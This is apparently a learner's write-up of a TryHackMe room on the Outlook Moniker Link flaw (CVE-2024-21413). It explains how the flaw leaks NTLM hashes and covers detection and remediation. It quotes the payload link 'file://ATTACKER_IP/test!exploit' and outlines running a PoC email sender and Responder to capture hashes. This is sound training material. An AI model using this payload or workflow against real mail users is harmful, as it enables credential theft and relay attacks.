# Room: Moniker Link (CVE-2024-21413) (TryHackMe)

**Date:** 6 Oct 2025  
**Path:** Cyber Security 101  
**Goal:** Understand the Moniker Link vulnerability (CVE-2024-21413) that bypasses Outlook's Protected View to leak user NTLM credentials, and learn exploitation, detection and remediation steps.

## 1. Key Concepts Learned

* **Vulnerability overview**:

  * CVE-2024-21413 (Moniker Link) allows an attacker to craft a specially formatted `file://` Moniker Link that bypasses Outlook's "Protected View" and causes the client to attempt to authenticate to an attacker-controlled SMB server, leaking the user's **netNTLMv2** hash.  
  * The attack was disclosed on February 13, 2024 and credited to Haifei Li of Check Point Research.  
  * A Moniker Link with a `!` character and additional text (e.g., `file://ATTACKER_IP/test!exploit`) is used to bypass Protected View. (TryHackMe walkthrough and PoC).

* **How the exploit works**:

  * Outlook renders HTML emails and supports Moniker Links (links that can invoke external applications or file resources).  
  * Normally Protected View blocks attempts to launch external applications or access network resources. The crafted Moniker Link variant circumvents this protection, forcing Windows to attempt SMB authentication to the attacker machine.  
  * The victim’s system will send NTLM authentication (netNTLMv2 hash) to the SMB listener even if the share does not exist — the authentication attempt is sufficient to capture the hash.  
  * While RCE via Moniker Link is discussed conceptually (COM/Component Object Model involvement), the room focuses on credential leakage and there was no public PoC for RCE in the room materials.

* **Proof of concept & tooling**:

  * The room includes a Python PoC that assembles an HTML email containing the malicious Moniker Link and sends it through an SMTP server to the victim mailbox.  
  * The attack lab demonstrates using **Responder** (or Impacket SMB listener) on the attacker's machine to capture the netNTLMv2 hash when the victim clicks the link.  

## 2. Commands / Tools Practiced

* Sending the exploit email (Python PoC from the room): create `exploit.py`, modify attacker/victim/MACHINE_IP values, then run `python3 exploit.py` to deliver the HTML email.  
* Start an SMB/LLMNR/NetBIOS listener (Responder): `responder -I <interface>` to capture authentication attempts.  
* Inspect captured hashes in Responder output (netNTLMv2).  
* (Optional) Use `impacket-smbserver` or other SMB services to emulate shares for testing.  
* Review YARA detection rule samples and use file inspection to spot suspicious `file:\` Moniker Link patterns in emails.

## 3. Takeaways

* Moniker Links can invoke OS components (COM) and are capable of triggering network authentication flows from email clients.  
* A simple crafted link (the `!` trick) was enough to bypass Outlook's Protected View and trigger SMB authentication, leaking credentials.  
* Captured netNTLMv2 hashes can be used offline by attackers to attempt cracking or relay attacks, depending on the environment.  
* Detection is possible using YARA rules searching for suspicious `file:\` patterns in email content and monitoring for unexpected SMB authentication attempts from client hosts.

## 4. Detection & Remediation

* **Detection**:

  * Deploy YARA rules to scan incoming email bodies for `file://` or `file:\` Moniker Link patterns (example rules exist in public repos).  
  * Monitor authentication logs and network flows for unexpected outbound SMB/NTLM auth attempts from client machines.  
  * Use endpoint telemetry and EDR alerts for processes (Outlook) initiating unexpected network connections.

* **Remediation**:

  * Apply Microsoft updates and patches listed in the MSRC advisory for CVE-2024-21413 as soon as possible.  
  * Consider blocking outbound SMB (ports 445/139) from client networks to the Internet.  
  * Harden mail gateway/email filtering to strip or sandbox suspicious HTML content and links.  
  * Educate users to avoid clicking unexpected links and to report suspicious emails.

## 5. Next Steps

* Practice the lab in the TryHackMe room (deploy the vulnerable VM and AttackBox) to see the full exploit flow in a safe environment.  
* Study netNTLMv2 cracking and relay defenses (SMB signing, disabling NTLM where possible).  
* Review Microsoft advisories and vendor-provided detection signatures for enterprise deployment.
